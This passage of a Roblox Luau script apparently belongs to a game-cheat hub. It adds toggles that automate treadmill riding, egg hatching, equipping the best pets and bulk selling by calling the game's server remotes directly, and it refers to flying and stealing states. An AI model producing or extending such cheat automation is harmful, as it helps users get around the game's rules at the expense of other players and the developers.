			local reRedeemVerdict = networking:FindFirstChild("RE/EggWorld/FieldEggRedeemVerdict")
			local reAlertsRaise = networking:FindFirstChild("RE/Alerts/Raise")

			if reRedeemVerdict and reRedeemVerdict:IsA("RemoteEvent") then
				local connRedeem = reRedeemVerdict.OnClientEvent:Connect(function()
					chilliState.SafeCarry.LastDelivered = os.clock()
				end)

				trackCleanup(function()
					connRedeem:Disconnect()
				end)
			end

			if reAlertsRaise and reAlertsRaise:IsA("RemoteEvent") then
				local connAlert = reAlertsRaise.OnClientEvent:Connect(function(alertData)
					if type(alertData) == "table" and type(alertData.Text) == "string" and string.find(alertData.Text, "Delivery failed", 1, true) then
						chilliState.SafeCarry.LastFailed = os.clock()
					end
				end)

				trackCleanup(function()
					connAlert:Disconnect()
				end)
			end
		end)

		do
			local treadmillDistTether = 10
			local stuckThreshold = 1
			local treadmillFailWait = 5

			local function invokeTreadmillAction(rfName)
				local rfObj = networking:FindFirstChild(rfName)
				if not rfObj or not rfObj:IsA("RemoteFunction") then
					return false, nil, nil
				end
				local ok, res1, res2 = pcall(rfObj.InvokeServer, rfObj)
				return ok, res1, res2
			end

			local treadmillFails = 0
			local isUsingTreadmill = false

			local function handleTreadmillResponse(ok, res1, res2)
				if ok and res1 ~= false then
					treadmillFails = 0
					isUsingTreadmill = false
					return true
				end

				if ok and tostring(res2) == "Already using treadmill" then
					treadmillFails = 0
					isUsingTreadmill = false
					return true
				end

				if ok and tostring(res2) == "Not grounded" and chilliState.Grounded() then
					treadmillFails += 1

					if treadmillFails >= 2 then
						treadmillFails = 0

						if not isUsingTreadmill then
							isUsingTreadmill = true
							pcall(chilliState.UndoSwap)
						elseif type(chilliState.RequestRespawn) == "function" then
							isUsingTreadmill = false
							chilliState.RequestRespawn()
						end
					end
				end

				return false
			end

			local treadmillToggleObj = nil
			local treadmillAutoWalkObj = nil
			local isTreadmillTaskRunning = false
			local treadmillTaskStamp = 0
			local isTreadmillDead = false
			local treadmillState = chilliState.Treadmill

			local function isTreadmillEnabled()
				return chilliState.Toggle(treadmillToggleObj, false)
			end

			local function shouldInterruptTreadmill()
				local moveState = chilliState.Movement
				return moveState.PlaceWanted or moveState.ScrambleWanted or moveState.MutationWanted or moveState.FracturedWanted or moveState.Owner ~= nil and moveState.Owner ~= "treadmill" or chilliState.Steal.Active or chilliState.Steal.Carrying
			end

			local function startTreadmill()
				local currentStamp = treadmillTaskStamp
				if shouldInterruptTreadmill() or not chilliState.ClaimMovement("treadmill") then
					return false
				end

				local function isTreadmillCancelled()
					return currentStamp ~= treadmillTaskStamp or not isTreadmillEnabled() or chilliState.Movement.Owner ~= "treadmill" or shouldInterruptTreadmill()
				end

				if chilliState.BeltHeld() then
					chilliState.ResetBelt()
				end

				local beltTarget = chilliState.Belt()
				if not beltTarget then
					return false
				end
				local targetPos = beltTarget.Position + Vector3.new(0, beltTarget.Size.Y / 2, 0)

				if chilliState.DistanceTo(targetPos + Vector3.new(0, 2, 0)) > treadmillDistTether then
					if type(chilliState.FlyTo) ~= "function" or not chilliState.FlyTo(targetPos, isTreadmillCancelled, "treadmill") then
						return false
					end
				end

				if isTreadmillCancelled() then
					return false
				end
				treadmillState.Riding = handleTreadmillResponse(invokeTreadmillAction("RF/Treadmill/AskWearStill"))
				return treadmillState.Riding
			end

			taskScheduler.Add(function()
				if not isTreadmillEnabled() then
					if treadmillState.Riding and not isTreadmillTaskRunning then
						isTreadmillTaskRunning = true

						task.spawn(function()
							pcall(chilliState.ExitBelt)
							isTreadmillTaskRunning = false
							taskScheduler.Wake()
						end)
					end

					return false
				end

				if isTreadmillTaskRunning or shouldInterruptTreadmill() then
					return false
				end

				if treadmillState.Riding and chilliState.Toggle(treadmillAutoWalkObj, true) and chilliState.OnBelt() then
					if os.clock() >= (treadmillState.NextCheck or 0) and not chilliState.Flying and chilliState.Grounded() then
						treadmillState.NextCheck = os.clock() + treadmillFailWait
						isTreadmillTaskRunning = true

						task.spawn(function()
							local ok, result = pcall(function()
								return handleTreadmillResponse(invokeTreadmillAction("RF/Treadmill/AskWearStill"))
							end)

							treadmillState.Riding = ok and result == true

							if not treadmillState.Riding then
								treadmillState.NextTry = 0
							end

							isTreadmillTaskRunning = false
							taskScheduler.Wake()
						end)
					end

					return false
				end

				if os.clock() < (treadmillState.NextTry or 0) then
					return false
				end
				treadmillState.NextCheck = 0
				treadmillState.NextTry = os.clock() + (treadmillState.LastFailed and 3 or 4)
				isTreadmillTaskRunning = true

				task.spawn(function()
					local ok, result = pcall(startTreadmill)
					treadmillState.LastFailed = not (ok and result == true)
					chilliState.ReleaseMovement("treadmill")
					isTreadmillTaskRunning = false
					taskScheduler.Wake()
				end)

				return false
			end)

			task.spawn(function()
				while not isTreadmillDead do
					task.wait(3)

					if not isTreadmillEnabled() and not shouldInterruptTreadmill() and not chilliState.Flying and chilliState.OnBelt() and chilliState.Grounded() then
						handleTreadmillResponse(invokeTreadmillAction("RF/Treadmill/AskWearStill"))
					end
				end
			end)

			task.spawn(function()
				local notOnBeltTime = 0

				while not isTreadmillDead do
					local dt = task.wait(0.25)

					if not isTreadmillEnabled() or not treadmillState.Riding or shouldInterruptTreadmill() then
						notOnBeltTime = 0
					elseif chilliState.OnBelt() then
						notOnBeltTime = 0
					else
						notOnBeltTime += dt

						if notOnBeltTime >= 1.5 then
							treadmillState.Riding = false
							treadmillState.NextTry = 0
							taskScheduler.Wake()
							notOnBeltTime = 0
						end
					end
				end
			end)

			task.spawn(function()
				local unstuckCooldown = 0
				local stuckTime = 0
				local lastPos = nil

				while not isTreadmillDead do
					local dt = task.wait(0.25)
					unstuckCooldown = math.max(0, unstuckCooldown - dt)
					local isOnTreadmillFine = treadmillState.Riding and isTreadmillEnabled() and not shouldInterruptTreadmill()
					local currentRoot = chilliState.Root()
					local character = localPlayer.Character
					character = character and character:FindFirstChildOfClass("Humanoid")

					if isOnTreadmillFine or not (chilliState.Flying or chilliState.Movement.Owner ~= nil or chilliState.Movement.PlaceWanted or character ~= nil and character.MoveDirection.Magnitude > 0.1) or not currentRoot or not chilliState.OnBelt() then
						lastPos = currentRoot and currentRoot.Position
						stuckTime = 0
						lastPos = lastPos or nil
					else
						local currPosXZ = Vector3.new(currentRoot.Position.X, 0, currentRoot.Position.Z)
						lastPos = lastPos and (currPosXZ - Vector3.new(lastPos.X, 0, lastPos.Z)).Magnitude < 0.5

						if lastPos then
							stuckTime += dt
						else
							stuckTime = 0
						end

						lastPos = currentRoot.Position

						if stuckTime >= stuckThreshold and unstuckCooldown <= 0 then
							pcall(chilliState.ExitBelt)
							unstuckCooldown = 1.5
							stuckTime = 0
						end
					end
				end
			end)

			trackCleanup(function()
				isTreadmillDead = true
				treadmillState.Riding = false
			end)

			treadmillToggleObj = autoTreadmillSection:CreateToggle({
				Name = "Auto Treadmill",
				Default = false,
				Callback = function()
					treadmillTaskStamp += 1
					chilliState.StopWalking()
					taskScheduler.Wake()
				end,
			})

			treadmillAutoWalkObj = autoTreadmillSection:CreateToggle({ Name = "Stay On Treadmill", Default = true })
		end

		do
			local hatchBatchSize = 4
			local hatchRetryDelay = 10
			local autoHatchHandle = nil
			local isHatchingTaskRunning = false
			local hatchStamp = 0
			local hatchFailCache = {}
			local hatchFilters = { MinRarity = 0, MinIncome = 0, Eggs = {} }

			local function invokeHatchAction(rfName, invokeArg)
				local rfObj = networking:FindFirstChild(rfName)
				if not rfObj or not rfObj:IsA("RemoteFunction") then
					return false, nil
				end
				return pcall(rfObj.InvokeServer, rfObj, invokeArg)
			end

			local function isEggOkToHatch(eggData)
				local isRarityOk = hatchFilters.MinRarity > 0

				if isRarityOk then
					local minRarity = hatchFilters.MinRarity
					isRarityOk = chilliState.EggRarity(eggData) < minRarity
				end

				if isRarityOk then
					return false
				end
				local isIncomeOk = hatchFilters.MinIncome > 0

				if isIncomeOk then
					local minIncome = hatchFilters.MinIncome
					isIncomeOk = chilliState.EggIncome(eggData) < minIncome
				end

				if isIncomeOk then
					return false
				end

				if next(hatchFilters.Eggs) ~= nil and hatchFilters.Eggs[tostring(eggData.AssetCategory)] ~= true then
					return false
				end
				return true
			end

			local function getHatchableEggs()
				local allEggs = getOwnerEggs()
				if type(allEggs) ~= "table" then
					return {}
				end
				local eggState = getEggState()
				local isAutoHatchOn = chilliState.Toggle(autoHatchHandle, false) == true
				local riftShortfallList = chilliState.RiftOn("Hatch") and chilliState.RiftShortfall() or {}
				local priorityHatchList = {}
				local normalHatchList = {}

				for uid, eggData in pairs(allEggs) do
					local canHatchTime = type(eggData) == "table" and eggData.Placement ~= nil

					if canHatchTime then
						canHatchTime = (hatchFailCache[uid] or 0) <= os.clock()
					end

					if canHatchTime then
						local isReady = false
						if type(eggState) == "table" and type(eggState.IsReadyToHatch) == "function" then
							local ok2, ready = pcall(eggState.IsReadyToHatch, uid)
							if ok2 and ready == true then
								isReady = true
							end
						end

						if not isReady and type(gameModules.EggRecords) == "table" and type(gameModules.EggRecords.IsGrown) == "function" then
							local serverTimeNow = workspace:GetServerTimeNow()
							local growthMultiplier = tonumber(eggData.GrowthSpeedMultiplier) or 1
							local nightCredit = type(gameModules.EggRecords.CurrentNightCredit) == "function" and gameModules.EggRecords.CurrentNightCredit(eggData, serverTimeNow, growthMultiplier) or 0
							local ok3, grown = pcall(gameModules.EggRecords.IsGrown, eggData, serverTimeNow, growthMultiplier, nightCredit, localPlayer)
							if ok3 and grown == true then
								isReady = true
							end
						end

						if isReady == true then
							local catStr = tostring(eggData.AssetCategory)

							if (riftShortfallList[catStr] or 0) > 0 then
								riftShortfallList[catStr] = riftShortfallList[catStr] - 1
								table.insert(priorityHatchList, uid)
							elseif isAutoHatchOn and isEggOkToHatch(eggData) then
								table.insert(normalHatchList, uid)
							end
						end
					end
				end

				for _, uid in ipairs(normalHatchList) do
					table.insert(priorityHatchList, uid)
				end

				return priorityHatchList
			end

			local function isHatchingEnabled()
				return chilliState.Toggle(autoHatchHandle, false) or chilliState.RiftOn("Hatch")
			end

			local function hatchLoopTick()
				local startStamp = hatchStamp
				local hatchList = getHatchableEggs()
				local hatchedCount = 0

				for _, uid in ipairs(hatchList) do
					if not (hatchedCount >= hatchBatchSize or startStamp ~= hatchStamp or not isHatchingEnabled()) then
						local askHatchOk, askHatchRes = invokeHatchAction("RF/EggWorld/AskHatch", uid)

						if askHatchOk and askHatchRes ~= false then
							task.wait(0.35)
							invokeHatchAction("RF/EggWorld/AskFinishHatch", uid)
							hatchedCount += 1
							hatchFailCache[uid] = nil
						else
							hatchFailCache[uid] = os.clock() + hatchRetryDelay
						end

						task.wait(0.2)
						continue
					end

					break
				end

				return hatchedCount > 0
			end

			taskScheduler.Add(function()
				if not isHatchingEnabled() or isHatchingTaskRunning then
					return false
				end
				isHatchingTaskRunning = true

				task.spawn(function()
					pcall(hatchLoopTick)
					isHatchingTaskRunning = false
				end)

				return false
			end)

			local function restartHatch()
				hatchStamp += 1
				table.clear(hatchFailCache)
				taskScheduler.Wake()
			end

			autoHatchHandle = autoHatchSection:CreateToggle({ Name = "Auto Hatch", Default = false, Callback = restartHatch })

			autoHatchSection:CreateDropdown({
				Name = "Hatch Min Rarity",
				Note = "Hatch eggs of the chosen rarity and every rarity above it",
				Options = filterRarities,
				Default = filterRarities[1],
				SubOf = autoHatchHandle,
				Callback = function(val)
					hatchFilters.MinRarity = rarityValues[val] or 0
					restartHatch()
				end,
			})

			local multiplierMap = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local minHatchValueState = { Slider = nil, Value = 0, Unit = "M/s" }

			local function updateMinHatchValue(num, suffix)
				if num ~= nil then
					minHatchValueState.Value = math.max(0, math.floor(tonumber(num) or minHatchValueState.Value))
				end

				if suffix ~= nil then
					minHatchValueState.Unit = tostring(suffix)
				end

				hatchFilters.MinIncome = minHatchValueState.Value * (multiplierMap[minHatchValueState.Unit] or multiplierMap["M/s"]).Mult
				restartHatch()
			end

			minHatchValueState.Slider = formatNumberSuffix(autoHatchSection, {
				Name = "Min Hatch Value",
				Note = "Skip eggs worth less than this (0 = off)",
				SubOf = autoHatchHandle,
				Legacy = "Hatch Min Value",
				SectionName = "Auto Hatch & Equip",
				OnRaw = function(arg)
					updateMinHatchValue(math.floor(arg / 1000), "K/s")
				end,
			})

			local hatchEggOptions = {}
			local hatchEggToCategoryMap = {}
			local assetsDir = gameModules.Assets and gameModules.Assets.Directory
			local waitElapsed = 0

			while (type(assetsDir) ~= "table" or next(assetsDir) == nil) and waitElapsed < 2 do
				waitElapsed += task.wait(0.1)

				if type(gameModules.Assets) ~= "table" then
					gameModules.Assets = safeRequire(function()
						return ReplicatedStorage.Data.Assets
					end)
				end

				assetsDir = gameModules.Assets and gameModules.Assets.Directory
			end

			local sortedHatchEggs = {}

			if type(assetsDir) == "table" then
				for catId, catData in pairs(assetsDir) do
					local rarityVal = type(catData) == "table" and catData.Rarity or nil
					local rarityNum = type(rarityVal) == "table"

					if rarityNum then
						rarityNum = tonumber(rarityVal.RarityNumber or rarityVal.Rank)
					end

					rarityNum = rarityNum or nil

					if rarityNum then
						table.insert(sortedHatchEggs, {
							Category = tostring(catId),
							Name = tostring(catData.DisplayName or catId),
							Rarity = rarityNum,
							RarityName = tostring(rarityVal.DisplayName or rarityVal._id or rarityNum),
						})
					end
				end
			end

			table.sort(sortedHatchEggs, function(e1, e2)
				if e1.Rarity ~= e2.Rarity then
					return e1.Rarity > e2.Rarity
				end
				return e1.Name < e2.Name
			end)

			for _, eggInfo in ipairs(sortedHatchEggs) do
				local eggLabel = string.format("%s [%s]", eggInfo.Name, eggInfo.RarityName)

				if hatchEggToCategoryMap[eggLabel] then
					eggLabel = string.format("%s [%s] (%s)", eggInfo.Name, eggInfo.RarityName, eggInfo.Category)
				end

				table.insert(hatchEggOptions, eggLabel)
				hatchEggToCategoryMap[eggLabel] = eggInfo.Category
			end

			if #hatchEggOptions > 0 then
				hookDropdownAllLabel(autoHatchSection:CreateMultiDropdown({
					Name = "Hatch Specific Eggs",
					Note = "Only hatch these eggs (empty = all)",
					Options = hatchEggOptions,
					Default = {},
					SubOf = autoHatchHandle,
					Callback = function(val)
						local whitelist = {}

						if type(val) == "table" then
							for key, v in pairs(val) do
								key = v == true and type(key) == "string" and key or type(v) == "string" and v or nil

								if key and hatchEggToCategoryMap[key] then
									whitelist[hatchEggToCategoryMap[key]] = true
								end
							end
						end

						hatchFilters.Eggs = whitelist
						restartHatch()
					end,
				}))
			end

			chilliState.Rift.Restart.Hatch = restartHatch
		end

		do
			local equipCheckDelay = 5
			local capacityCacheTime = 30
			local autoEquipHandle = nil
			local isEquipTaskRunning = false
			local nextEquipCheck = 0
			local equipFailCache = {}
			local equipStamp = 0
			local equipBestFirst = true
			local cachedEquipCapacity = nil
			local capacityCacheStamp = -math.huge

			local function getEquipCapacity(saveData)
				local basesModule = safeRequire(function()
					return ReplicatedStorage.Data.Bases
				end)

				if type(basesModule) == "table" and type(basesModule.GetAssetEquipCapacity) == "function" then
					local ok, capacity = pcall(basesModule.GetAssetEquipCapacity, saveData and tonumber(saveData.BaseUpgradeLevel) or 0)
					if ok and tonumber(capacity) then
						return math.floor(tonumber(capacity))
					end
				end

				if cachedEquipCapacity and os.clock() - capacityCacheStamp < capacityCacheTime then
					return cachedEquipCapacity
				end
				local rfWearLimit = networking:FindFirstChild("RF/PenRoster/AskWearLimit")

				if rfWearLimit and rfWearLimit:IsA("RemoteFunction") then
					local ok, capacity = pcall(rfWearLimit.InvokeServer, rfWearLimit)

					if ok and tonumber(capacity) then
						local fallbackCap = math.floor(tonumber(capacity))
						local now = os.clock()
						cachedEquipCapacity = fallbackCap
						capacityCacheStamp = now
						return cachedEquipCapacity
					end
				end

				local prevCap = cachedEquipCapacity
				local fallbackCap

				if cachedEquipCapacity then
					fallbackCap = prevCap
				else
					fallbackCap = 0
				end

				return fallbackCap
			end

			local function getEquipEggIncome(eggData)
				local assetsDir = gameModules.Assets and gameModules.Assets.Directory
				local catData = type(assetsDir) == "table" and assetsDir[tostring(eggData.Category)] or nil
				local baseRate = type(catData) == "table" and tonumber(catData.EarningRate) or 0
				local eggScale = tonumber(eggData.Scale) or 0
				if baseRate <= 0 or eggScale <= 0 then
					return 0
				end
				local scaleMult = eggScale > 5 and (eggScale / 5) ^ 1.2 * 19.637875755794113 or eggScale ^ 1.85
				local mutations = gameModules.Mutations
				local hasMutations = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local mutationMult = 1

				if hasMutations then
					local ok, res = pcall(mutations.EarningsFor, type(eggData.Mutations) == "table" and eggData.Mutations or {})
					ok = ok and type(res) == "number"
					local defaultMult = 1

					if ok then
						mutationMult = res
					else
						mutationMult = defaultMult
					end
				end

				return baseRate * scaleMult * mutationMult
			end

			local function getEquipLists()
				local saveModule = gameModules.Save
				local saveData

				if type(saveModule) == "table" and type(saveModule.Get) == "function" then
					local ok
					ok, saveData = pcall(saveModule.Get)
					saveData = ok and type(saveData) == "table" and saveData or nil
				end

				if not saveData then
					return nil
				end
				local equippedSet = {}
				local equippedList = {}
				local pairsFn = pairs
				local equippedAssets = saveData.EquippedAssets or {}

				for _, equippedAsset in pairsFn(equippedAssets) do
					if type(equippedAsset) == "string" then
						equippedSet[equippedAsset] = true
						table.insert(equippedList, equippedAsset)
					end
				end

				local sortedEggList = {}
				local pairsFn = pairs
				local inventory = saveData.Inventory or {}

				for uid, egg in pairsFn(inventory) do
					if type(egg) == "table" and egg.InFuse ~= true then
						table.insert(sortedEggList, { Uid = uid, Income = getEquipEggIncome(egg), Equipped = equippedSet[uid] == true })
					end
				end

				table.sort(sortedEggList, function(arg, arg2)
					if arg.Income ~= arg2.Income then
						return arg.Income > arg2.Income
					end
					return tostring(arg.Uid) < tostring(arg2.Uid)
				end)

				return sortedEggList, equippedSet, #equippedList, saveData
			end

			local function getUnequippedBest(eggList, cap)
				local bestToEquip = {}
				local hasUncached = false

				for i, eggData in ipairs(eggList) do
					if not (cap < i) then
						if not eggData.Equipped then
							table.insert(bestToEquip, eggData.Uid)

							if not equipFailCache[eggData.Uid] then
								hasUncached = true
							end
						end

						continue
					end

					break
				end

				return bestToEquip, hasUncached
			end

			taskScheduler.Add(function()
				if not chilliState.Toggle(autoEquipHandle, false) then
					return false
				end
				local eggList, equippedSet, equippedCount, saveData = getEquipLists()

				if eggList then
					local capacity = getEquipCapacity(saveData)
					local bestToEquip, hasUncached = getUnequippedBest(eggList, capacity)

					if (hasUncached or equipBestFirst) and not isEquipTaskRunning and os.clock() >= equipStamp then
						for _, uid in ipairs(bestToEquip) do
							equipFailCache[uid] = true
						end

						equipBestFirst = false
						isEquipTaskRunning = true
						equipStamp = os.clock() + equipCheckDelay
						local startStamp = nextEquipCheck

						task.spawn(function()
							local rfHaulFetchWearBestStatus = networking:FindFirstChild("RF/Haul/FetchWearBestStatus")
							local isRemoteFunction = rfHaulFetchWearBestStatus and rfHaulFetchWearBestStatus:IsA("RemoteFunction")
							local statusOk = true

							if isRemoteFunction then
								local ok, result = pcall(rfHaulFetchWearBestStatus.InvokeServer, rfHaulFetchWearBestStatus)
								statusOk = ok and result ~= false and result ~= nil
							end

							local rfHaulWearBest = networking:FindFirstChild("RF/Haul/WearBest")

							if statusOk and startStamp == nextEquipCheck and rfHaulWearBest and rfHaulWearBest:IsA("RemoteFunction") then
								pcall(rfHaulWearBest.InvokeServer, rfHaulWearBest)
							end

							isEquipTaskRunning = false
							taskScheduler.Wake()
						end)
					end
				end

				return false
			end)

			autoEquipHandle = autoHatchSection:CreateToggle({
				Name = "Auto Equip Best",
				Note = "Equip Best when a better pet appears",
				Default = false,
				Callback = function()
					nextEquipCheck += 1
					table.clear(equipFailCache)
					equipStamp = 0
					equipBestFirst = true
					taskScheduler.Wake()
				end,
			})

			local saveModule = gameModules.Save

			if type(saveModule) == "table" and type(saveModule.FieldSignal) == "function" then
				for _, fieldName in ipairs({ "Inventory", "EquippedAssets" }) do
					local ok, fieldSignal = pcall(saveModule.FieldSignal, fieldName)

					if ok and type(fieldSignal) == "table" and type(fieldSignal.Connect) == "function" then
						local ok2, conn = pcall(fieldSignal.Connect, fieldSignal, function()
							equipBestFirst = true
							taskScheduler.Wake()
						end)

						if ok2 and conn then
							trackCleanup(function()
								pcall(function()
									conn:Disconnect()
								end)
							end)
						end
					end
				end
			end
		end

		local scrambleBatchSize
		scrambleBatchSize = 3
		local scrambleModes, scrambleRarityList, scrambleRarityMap, scrambleEggOptions, scrambleEggToCategoryMap

		do
			local maxScrambleEggs = 50
			scrambleModes = { "Rarity Only", "Value Only", "Rarity And Value", "Rarity Or Value" }

			local assetItemsModule = safeRequire(function()
				return ReplicatedStorage.Shared.Util.AssetItems
			end)

			scrambleRarityList = {}
			scrambleRarityMap = {}
			scrambleEggOptions = {}
			scrambleEggToCategoryMap = {}
			local assetsDir = gameModules.Assets and gameModules.Assets.Directory
			local rarityNumToName = {}
			local sortedScrambleEggs = {}

			if type(assetsDir) == "table" then
				for catId, catData in pairs(assetsDir) do
					local rarityVal = type(catData) == "table" and catData.Rarity or nil
					local rarityNum = type(rarityVal) == "table"

					if rarityNum then
						rarityNum = tonumber(rarityVal.RarityNumber or rarityVal.Rank)
					end

					rarityNum = rarityNum or nil

					if rarityNum then
						local rarityStr = tostring(rarityVal.DisplayName or rarityVal._id or rarityNum)
						rarityNumToName[rarityNum] = rarityNumToName[rarityNum] or rarityStr

						table.insert(sortedScrambleEggs, {
							Category = tostring(catId),
							Name = tostring(catData.DisplayName or catId),
							Rarity = rarityNum,
							RarityName = rarityStr,
						})
					end
				end
			end

			local sortedRarityNums = {}

			for rarityNum in pairs(rarityNumToName) do
				table.insert(sortedRarityNums, rarityNum)
			end

			table.sort(sortedRarityNums)

			for _, rarityNum in ipairs(sortedRarityNums) do
				local rarityStr = string.format("%d - %s", rarityNum, rarityNumToName[rarityNum])
				table.insert(scrambleRarityList, rarityStr)
				scrambleRarityMap[rarityStr] = rarityNum
			end

			table.sort(sortedScrambleEggs, function(e1, e2)
				if e1.Rarity ~= e2.Rarity then
					return e1.Rarity < e2.Rarity
				end
				return e1.Name < e2.Name
			end)

			for _, eggInfo in ipairs(sortedScrambleEggs) do
				local eggLabel = string.format("%s [%s]", eggInfo.Name, eggInfo.RarityName)

				if scrambleEggToCategoryMap[eggLabel] then
					eggLabel = string.format("%s [%s] (%s)", eggInfo.Name, eggInfo.RarityName, eggInfo.Category)
				end

				table.insert(scrambleEggOptions, eggLabel)
				scrambleEggToCategoryMap[eggLabel] = eggInfo.Category
			end

			local function getScrambleRarityStr(num)
				for _, rarityStr in ipairs(scrambleRarityList) do
					if scrambleRarityMap[rarityStr] == num then
						return rarityStr
					end
				end

				return scrambleRarityList[1]
			end

			local scrambleLoopHandle = nil
			local tradeInLoopHandle = nil
			local scrambleStatusRow = nil
			local tradeInStatusRow = nil
			local scrambleMode = scrambleModes[1]
			local scrambleMaxRarity = 3
			local scrambleMaxIncome = 0
			local scrambleKeepMutations = true
			local scrambleIgnoredCategories = {}
			local tradeInMode = scrambleModes[1]
			local tradeInMaxRarity = 3
			local tradeInMaxIncome = 0
			local tradeInKeepMutations = true
			local tradeInIgnoredCategories = {}
			local isScrambleRunning = false
			local scrambleActionStamp = 0

			local function formatScrambleCurrency(val)
				local num = tonumber(val) or 0
				local suffixes = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local suffixIdx = 1

				while math.abs(num) >= 1000 and suffixIdx < #suffixes do
					num /= 1000
					suffixIdx += 1
				end

				return string.format(suffixIdx == 1 and "$%.0f%s" or "$%.2f%s", num, suffixes[suffixIdx])
			end

			local function parseIgnoredCategories(val, map)
				local ignored = {}

				if type(val) == "table" then
					for k, v in pairs(val) do
						k = v == true and type(k) == "string" and k or type(v) == "string" and v or nil

						if k then
							ignored[map and map[k] or k] = true
						end
					end
				end

				return ignored
			end

			local function getCategoryRarityNum(categoryId)
				local assetsDir = gameModules.Assets and gameModules.Assets.Directory
				local catData = type(assetsDir) == "table" and assetsDir[tostring(categoryId)] or nil
				local rarityVal = type(catData) == "table" and catData.Rarity or nil
				local rarityNum = type(rarityVal) == "table"

				if rarityNum then
					rarityNum = tonumber(rarityVal.RarityNumber or rarityVal.Rank)
				end

				return rarityNum or math.huge
			end

			local function getScrambleEggIncome(eggData)
				local assetsDir = gameModules.Assets and gameModules.Assets.Directory
				local catData = type(assetsDir) == "table" and assetsDir[tostring(eggData.Category)] or nil
				local baseRate = type(catData) == "table" and tonumber(catData.EarningRate) or 0
				local eggScale = tonumber(eggData.Scale) or 0
				if baseRate <= 0 or eggScale <= 0 then
					return 0
				end
				local scaleMult = eggScale > 5 and (eggScale / 5) ^ 1.2 * 19.637875755794113 or eggScale ^ 1.85
				local mutations = gameModules.Mutations
				local hasMut = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local mutationMult = 1

				if hasMut then
					local ok, res = pcall(mutations.EarningsFor, type(eggData.Mutations) == "table" and eggData.Mutations or {})

					if ok and type(res) == "number" then
						mutationMult = res
					end
				end

				return baseRate * scaleMult * mutationMult
			end

			local function hasMutations(muts)
				return type(muts) == "table" and next(muts) ~= nil
			end

			local function getScrambleSaveData()
				local saveModule = gameModules.Save
				if type(saveModule) ~= "table" or type(saveModule.Get) ~= "function" then
					return nil
				end
				local ok, saveData = pcall(saveModule.Get)
				return ok and type(saveData) == "table" and saveData or nil
			end

			local function getEggsToScramble()
				local saveData = getScrambleSaveData()
				local eggsToScramble = {}
				if not saveData then
					return eggsToScramble, 0
				end
				local equippedSet = {}
				local pairsFn = pairs
				local equippedAssets = saveData.EquippedAssets or {}

				for _, equippedAsset in pairsFn(equippedAssets) do
					equippedSet[equippedAsset] = true
				end

				local pairsFn2 = pairs
				local inventory = saveData.Inventory or {}
				local totalScrambleValue = 0

				for uid, eggData in pairsFn2(inventory) do
					local isOkToScramble = type(eggData) == "table" and eggData.InFuse ~= true and eggData.IsFavorite ~= true and not equippedSet[uid] and not scrambleIgnoredCategories[tostring(eggData.Category)]

					if isOkToScramble then
						isOkToScramble = not (scrambleKeepMutations and hasMutations(eggData.Mutations))
					end

					if isOkToScramble then
						local eggIncome = getScrambleEggIncome(eggData)
						local isRarityOk = getCategoryRarityNum(eggData.Category) <= scrambleMaxRarity
						local isIncomeOk = scrambleMaxIncome > 0 and eggIncome < scrambleMaxIncome

						if scrambleMode ~= scrambleModes[2] then
							if scrambleMode == scrambleModes[3] then
								isIncomeOk = isRarityOk and isIncomeOk
							elseif scrambleMode == scrambleModes[4] then
								isIncomeOk = isRarityOk or isIncomeOk
							else
								isIncomeOk = isRarityOk
							end
						end

						if isIncomeOk then
							table.insert(eggsToScramble, uid)
							local hasSalePrice = type(assetItemsModule) == "table" and type(assetItemsModule.SalePrice) == "function"
							local ok = false
							local salePrice = nil

							if hasSalePrice then
								ok, salePrice = pcall(assetItemsModule.SalePrice, eggData)
							end

							totalScrambleValue += ok and tonumber(salePrice) or eggIncome * 100
						end
					end
				end

				return eggsToScramble, totalScrambleValue
			end

			local function getEggsToTradeIn()
				local eggsToTradeIn = {}
				local allOwnerEggs = getOwnerEggs()
				if type(allOwnerEggs) ~= "table" then
					return eggsToTradeIn, 0
				end
				local character = localPlayer.Character
				character = character and character:FindFirstChildWhichIsA("Tool")
				local carriedEggUid = character and character:GetAttribute("UID") or nil
				local eggRecords = gameModules.EggRecords
				local iter, t, i = pairs(allOwnerEggs)
				local totalTradeInValue = 0

				for uid, eggData in iter, t, i do
					local isOkToTradeIn = type(eggData) == "table" and eggData.Placement == nil and uid ~= carriedEggUid and not tradeInIgnoredCategories[tostring(eggData.AssetCategory)]

					if isOkToTradeIn then
						isOkToTradeIn = not (tradeInKeepMutations and hasMutations(eggData.Mutations))
					end

					if isOkToTradeIn then
						local eggIncome = getScrambleEggIncome({ Category = eggData.AssetCategory, Scale = eggData.AssetScale, Mutations = eggData.Mutations })
						local isRarityOk = getCategoryRarityNum(eggData.AssetCategory) <= tradeInMaxRarity
						local isIncomeOk = tradeInMaxIncome > 0 and eggIncome < tradeInMaxIncome

						if tradeInMode ~= scrambleModes[2] then
							if tradeInMode == scrambleModes[3] then
								isIncomeOk = isRarityOk and isIncomeOk
							elseif tradeInMode ~= scrambleModes[4] then
								isIncomeOk = isRarityOk
							else
								isIncomeOk = isRarityOk or isIncomeOk
							end
						end

						if isIncomeOk then
							table.insert(eggsToTradeIn, uid)

							if type(eggRecords) == "table" and type(eggRecords.SellPrice) == "function" then
								local ok2, result2 = pcall(eggRecords.SellPrice, eggData)
								totalTradeInValue += ok2 and tonumber(result2) or 0
							end
						end
					end
				end

				return eggsToTradeIn, totalTradeInValue
			end

			local function invokeScrambleBatch(scrambleList, tradeInList)
				local reSellSelection = networking:FindFirstChild("RE/PetSatchel/SellSelection")
				if not reSellSelection or not reSellSelection:IsA("RemoteEvent") then
					return false
				end
				local maxCount = math.max(#scrambleList, #tradeInList)
				local startIndex = 1

				while startIndex <= maxCount do
					local batchScramble = {}
					local batchTradeIn = {}

					for i = startIndex, startIndex + maxScrambleEggs - 1 do
						if scrambleList[i] then
							table.insert(batchScramble, scrambleList[i])
						end

						if tradeInList[i] then
							table.insert(batchTradeIn, tradeInList[i])
						end
					end

					pcall(reSellSelection.FireServer, reSellSelection, { Eggs = batchTradeIn, Assets = batchScramble })
					startIndex += maxScrambleEggs

					if startIndex <= maxCount then
						task.wait(0.3)
					end
				end

				return true
			end

			local function executeScrambleAction(scrambleList, tradeInList)
				local isChecking = isScrambleRunning

				if not isScrambleRunning then
					isChecking = #scrambleList == 0 and #tradeInList == 0
				end

				if isChecking then
					return
				end
